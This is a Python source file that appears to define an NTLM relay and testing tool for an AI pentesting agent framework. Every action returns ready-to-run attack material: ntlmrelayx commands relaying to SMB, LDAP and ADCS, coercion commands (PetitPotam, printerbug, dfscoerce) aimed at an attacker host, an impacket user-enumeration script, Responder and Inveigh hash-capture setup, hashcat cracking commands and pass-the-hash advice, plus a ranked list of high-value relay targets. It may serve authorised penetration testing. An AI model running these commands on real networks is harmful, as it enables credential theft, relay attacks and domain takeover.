"""NTLM authentication testing and relay attack tool."""

from typing import Any, Literal

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)

ToolAction = Literal[
    "check_signing",
    "test_relay_target",
    "enumerate_users",
    "capture_hash_setup",
    "analyze_ntlm_response",
]


@register_tool(sandbox_execution=True)
def ntlm_tester(
    action: ToolAction,
    target: str | None = None,
    domain: str | None = None,
    usernames: list[str] | None = None,
    hash_value: str | None = None,
    interface: str | None = None,
    port: int | None = None,
    **kwargs: Any,
) -> dict[str, Any] | str:
    """NTLM authentication testing and relay attack tool.

    Args:
        action: The action to perform
        target: Target host or IP address
        domain: Domain name for enumeration
        usernames: List of usernames to test
        hash_value: NTLM hash for analysis
        interface: Network interface for capture
        port: Target port number

    Returns:
        Results dict or error message
    """
    VALID_PARAMS = {
        "action", "target", "domain", "usernames", "hash_value",
        "interface", "port",
    }
    VALID_ACTIONS = [
        "check_signing",
        "test_relay_target",
        "enumerate_users",
        "capture_hash_setup",
        "analyze_ntlm_response",
    ]

    if unknown_error := validate_unknown_params(kwargs, VALID_PARAMS, "ntlm_tester"):
        return unknown_error

    if action_error := validate_action_param(action, VALID_ACTIONS, "ntlm_tester"):
        return action_error

    if action == "check_signing":
        if param_error := validate_required_param(target, "target", action, "ntlm_tester"):
            return param_error

        return {
            "action": "check_signing",
            "target": target,
            "description": "Check if SMB/LDAP signing is required or disabled",
            "methodology": [
                "1. Connect to target SMB/LDAP service",
                "2. Check negotiation flags for signing requirements",
                "3. If signing not required, relay attacks possible",
            ],
            "nmap_command": f"nmap -p 445,389 --script smb2-security-mode,ldap-rootdse {target}",
            "crackmapexec_command": f"crackmapexec smb {target} --gen-relay-list relay_targets.txt",
            "python_example": f'''
import socket
from impacket.smbconnection import SMBConnection

target = "{target}"

try:
    conn = SMBConnection(target, target, timeout=5)

    # Check if signing is required
    if conn.isSigningRequired():
        print(f"[-] SMB signing REQUIRED on {{target}} - relay not possible")
    else:
        print(f"[+] SMB signing NOT required on {{target}} - RELAY POSSIBLE!")

    conn.close()
except Exception as e:
    print(f"[-] Error: {{e}}")
''',
            "signing_impact": {
                "smb_signing_disabled": "Full NTLM relay possible to SMB",
                "ldap_signing_disabled": "NTLM relay to LDAP (RBCD attacks)",
                "ldaps_channel_binding_disabled": "LDAPS relay possible",
            },
            "relay_targets_priority": [
                "Domain Controllers without signing (rare but devastating)",
                "Exchange servers (PrivExchange attacks)",
                "SCCM/MECM servers",
                "ADCS servers (ESC8)",
                "Any server with local admin for attacker",
            ],
        }

    elif action == "test_relay_target":
        if param_error := validate_required_param(target, "target", action, "ntlm_tester"):
            return param_error

        target_port = port or 445

        return {
            "action": "test_relay_target",
            "target": target,
            "port": target_port,
            "description": "Test if target is viable for NTLM relay",
            "checks": [
                "SMB signing requirement",
                "LDAP signing requirement",
                "EPA (Extended Protection for Authentication)",
                "Channel binding requirements",
            ],
            "ntlmrelayx_setup": f'''
# Set up NTLM relay server targeting this host
ntlmrelayx.py -t smb://{target} -smb2support

# For LDAP relay (requires no signing/channel binding)
ntlmrelayx.py -t ldap://{target} --escalate-user attacker

# For ADCS relay (ESC8)
ntlmrelayx.py -t http://{target}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
''',
            "coercion_methods": {
                "petitpotam": f"python3 PetitPotam.py -d domain -u user -p pass attacker_ip {target}",
                "printerbug": f"python3 printerbug.py domain/user:pass@{target} attacker_ip",
                "dfscoerce": f"python3 dfscoerce.py -d domain -u user -p pass attacker_ip {target}",
            },
            "mitm_position": "Attacker must be able to intercept or coerce authentication",
            "attack_chains": [
                "Coerce DC -> Relay to ADCS -> Get DC certificate",
                "Coerce server -> Relay to LDAP -> RBCD attack",
                "Coerce workstation -> Relay to SMB -> Code execution",
            ],
        }

    elif action == "enumerate_users":
        if param_error := validate_required_param(target, "target", action, "ntlm_tester"):
            return param_error

        user_list = usernames or ["administrator", "admin", "guest", "user"]

        return {
            "action": "enumerate_users",
            "target": target,
            "domain": domain or "WORKGROUP",
            "usernames_to_test": user_list,
            "description": "Enumerate valid domain users via NTLM responses",
            "methodology": [
                "1. Send NTLM authentication attempts",
                "2. Analyze error responses",
                "3. STATUS_LOGON_FAILURE = valid user, wrong password",
                "4. STATUS_NO_SUCH_USER = invalid user",
            ],
            "kerbrute_command": f'''
# User enumeration via Kerberos (faster, less noise)
kerbrute userenum -d {domain or 'domain.local'} --dc {target} userlist.txt
''',
            "python_example": f'''
from impacket.smbconnection import SMBConnection

target = "{target}"
domain = "{domain or 'WORKGROUP'}"
users = {user_list}

for user in users:
    try:
        conn = SMBConnection(target, target, timeout=5)
        conn.login(user, 'WrongPassword123!', domain)
    except Exception as e:
        error = str(e)
        if "STATUS_LOGON_FAILURE" in error:
            print(f"[+] VALID USER: {{domain}}\\\\{{user}}")
        elif "STATUS_PASSWORD_EXPIRED" in error:
            print(f"[+] VALID USER (pwd expired): {{domain}}\\\\{{user}}")
        elif "STATUS_ACCOUNT_DISABLED" in error:
            print(f"[+] VALID USER (disabled): {{domain}}\\\\{{user}}")
        elif "STATUS_ACCOUNT_LOCKED_OUT" in error:
            print(f"[!] USER LOCKED: {{domain}}\\\\{{user}}")
        else:
            print(f"[-] Invalid user or error: {{user}} - {{error}}")
''',
            "error_codes": {
                "STATUS_LOGON_FAILURE": "Valid user, wrong password",
                "STATUS_NO_SUCH_USER": "User does not exist",
                "STATUS_PASSWORD_EXPIRED": "Valid user, password expired",
                "STATUS_ACCOUNT_DISABLED": "Valid user, account disabled",
                "STATUS_ACCOUNT_LOCKED_OUT": "Valid user, locked out",
            },
            "tips": [
                "Enumerate with Kerberos (kerbrute) for less noise",
                "Be careful of account lockout policies",
                "Some environments log NTLM auth attempts",
            ],
        }

    elif action == "capture_hash_setup":
        net_interface = interface or "eth0"

        return {
            "action": "capture_hash_setup",
            "interface": net_interface,
            "description": "Set up NTLM hash capture using responder or similar",
            "responder_setup": f'''
# Start Responder to capture NTLM hashes
sudo responder -I {net_interface} -wrf

# Options:
# -w: Start WPAD rogue proxy server
# -r: Enable answers for netbios wredir suffix queries
# -f: Force WPAD auth, force LM downgrade
# -v: Verbose mode
''',
            "ntlmrelayx_capture": f'''
# Capture hashes without relaying
ntlmrelayx.py -smb2support -tf targets.txt

# Save to file for cracking
ntlmrelayx.py -smb2support -of captured_hashes
''',
            "inveigh_powershell": '''
# PowerShell alternative (Windows)
Import-Module Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y
''',
            "coercion_techniques": {
                "llmnr_nbns": "Respond to broadcast name resolution (automatic)",
                "wpad": "Proxy auto-config poisoning",
                "file_share": "Create file with UNC path (1x1 images, desktop.ini)",
                "printerbug": "Force authentication from other machines",
                "petitpotam": "EFS RPC coercion (unauthenticated on old DCs)",
            },
            "hash_format": "user::domain:challenge:response:response",
            "cracking_with_hashcat": '''
# NTLMv2 hash cracking
hashcat -m 5600 captured_hashes.txt wordlist.txt

# With rules
hashcat -m 5600 captured_hashes.txt wordlist.txt -r rules/best64.rule
''',
            "important": [
                "Responder requires root/admin privileges",
                "Captured hashes are NTLMv1/v2, not raw NTLM",
                "NTLMv2 is harder to crack than NTLMv1",
                "Consider relay over cracking when possible",
            ],
        }

    elif action == "analyze_ntlm_response":
        if param_error := validate_required_param(hash_value, "hash_value", action, "ntlm_tester"):
            return param_error

        return {
            "action": "analyze_ntlm_response",
            "hash_value": hash_value,
            "description": "Analyze captured NTLM hash structure",
            "hash_types": {
                "ntlmv1": {
                    "format": "user::domain:LM_response:NTLM_response:challenge",
                    "hashcat_mode": 5500,
                    "crackability": "Easier to crack, rainbow tables available",
                },
                "ntlmv2": {
                    "format": "user::domain:challenge:response:blob",
                    "hashcat_mode": 5600,
                    "crackability": "Harder, no rainbow tables, need brute force",
                },
                "ntlm_hash": {
                    "format": "32 character hex (MD4 of password)",
                    "hashcat_mode": 1000,
                    "crackability": "Direct NTLM hash, pass-the-hash possible",
                },
            },
            "analysis_steps": [
                "1. Identify hash type by format",
                "2. Extract username and domain",
                "3. Determine cracking difficulty",
                "4. Choose appropriate attack method",
            ],
            "python_analysis": '''
import re

def analyze_ntlm_hash(hash_string):
    """Analyze NTLM hash format."""

    # NTLMv2 format
    ntlmv2_pattern = r'^([^:]+)::([^:]+):([a-fA-F0-9]{16}):([a-fA-F0-9]{32}):(.+)$'

    # NTLMv1 format
    ntlmv1_pattern = r'^([^:]+)::([^:]+):([a-fA-F0-9]{48}):([a-fA-F0-9]{48}):([a-fA-F0-9]{16})$'

    # Raw NTLM (32 hex chars)
    raw_pattern = r'^[a-fA-F0-9]{32}$'

    if re.match(ntlmv2_pattern, hash_string):
        match = re.match(ntlmv2_pattern, hash_string)
        return {
            "type": "NTLMv2",
            "user": match.group(1),
            "domain": match.group(2),
            "hashcat_mode": 5600,
            "crackable": True,
            "relay_possible": False  # Already captured response
        }
    elif re.match(ntlmv1_pattern, hash_string):
        return {"type": "NTLMv1", "hashcat_mode": 5500}
    elif re.match(raw_pattern, hash_string):
        return {"type": "Raw NTLM", "hashcat_mode": 1000, "pth_possible": True}
    else:
        return {"type": "Unknown format"}
''',
            "attack_recommendations": {
                "ntlmv1": "Crack with hashcat -m 5500 or use rainbow tables",
                "ntlmv2": "Crack with hashcat -m 5600, use good wordlist + rules",
                "raw_ntlm": "Pass-the-hash attacks, no cracking needed",
            },
        }

    return generate_usage_hint("ntlm_tester", VALID_ACTIONS)
